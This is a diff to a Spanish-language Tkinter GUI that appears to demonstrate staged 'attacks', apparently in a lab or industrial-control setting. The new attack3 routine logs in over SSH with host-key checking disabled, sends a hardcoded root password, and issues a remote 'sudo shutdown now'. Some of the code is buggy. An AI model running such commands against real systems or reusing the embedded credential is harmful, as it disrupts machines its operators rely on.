@@ -6,6 +6,7 @@ from io import BytesIO
 import paramiko
 from tkterm import Terminal
 from test import *
+import os
 #from pycomm.ab_comm import LogixDriver
 
 
@@ -120,7 +121,7 @@ image_label = Label(frame, image=photo, bg="black")
 image_label.grid(row=0, column=1, rowspan=4, padx=10, pady=10, sticky="nsew")
 
 
-
+###########################################################################################################################################################################################
 # Columna de botones a la derecha
 def attack1():
     messageWindow = Toplevel(main_screen)
@@ -132,7 +133,7 @@ def attack1():
     tit = Label(messageWindow, text="Este es el ataque de nivel 1", font="Helvetica 20 bold", bg="black", fg="white")
     tit.pack(pady=50)
     sub = Label(messageWindow, text="Listado de directorio", font="Helvetica 20", bg="black", fg="white")
-    sub.pack(side=TOP)
+    sub.pack(pady=30)
 
     #Descomentar para agregar boton si no pasa ssh
     #Regresar a menu principal
@@ -176,6 +177,7 @@ def attack1():
 atk1 = tk.Button(frame, text="Prueba de ataque 1", bg="black", fg="white", command=attack1)
 atk1.grid(row=0, column=2, padx=10, pady=10, sticky="nsew")
 
+###########################################################################################################################################################################################
 def attack2():
     messageWindow = Toplevel(main_screen)
     messageWindow.title("Ataque nivel 2")
@@ -192,12 +194,44 @@ def attack2():
 atk2 = tk.Button(frame, text="prueba de ataque 2", bg="black", fg="white", command=attack2)
 atk2.grid(row=1, column=2, padx=10, pady=10, sticky="nsew")
 
+
+###########################################################################################################################################################################################
 def attack3():
     messageWindow = Toplevel(main_screen)
     messageWindow.title("Ataque nivel 3")
-    messageWindow.geometry("860x560")
-    Label(messageWindow, text="Este is el ataque de nivel 3").pack()
-    main_screen.withdraw()
+    #messageWindow.geometry("860x560")
+    #permite pantalla fullscreen
+    messageWindow.attributes('-fullscreen', True)
+    messageWindow.config(background="black")
+    tit = Label(messageWindow, text="Este es el ataque de nivel 3", font="Helvetica 20 bold", bg="black", fg="white")
+    tit.pack(pady=50)
+    sub = Label(messageWindow, text="Explotación de vulernabilidad", font="Helvetica 20", bg="black", fg="white")
+    sub.pack(pady=30)
+
+    #Descomentar para agregar boton si no pasa ssh
+    #Regresar a menu principal
+    btn_back= Button(messageWindow, text="Regresar", font=12, height=4, width=30,bg="black", fg="white", command=lambda: main_screen.tkraise()).pack()
+    btn_back.grid(row=0, column=1,padx=10, pady=10, sticky="nsew")
+
+
+    #Conexion ssh para demostracion
+    client = paramiko.client.SSHClient()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    client.connect(ip, username=user, password=password)
+    #Se ejecuta comando
+    _stdin, _stdout,_stderr = client.exec_command("su")
+    _stdin, _stdout,_stderr = client.exec_command("Absa2023!")
+    _stdin, _stdout,_stderr = client.exec_command("sudo shutdown now")
+    client.close()
+
+
+    #### Codigo para PLC
+
+    ###### Botones
+    #Regresar a menu principal
+    btn_back= Button(messageWindow, text="Regresar", font=12, height=4, width=30,bg="black", fg="white", command=lambda: main_screen.tkraise()).pack()
+    btn_back.grid(row=0,column=1,padx=10, pady=10, sticky="nsew")
+    
 
     def on_closing():
         messageWindow.destroy()
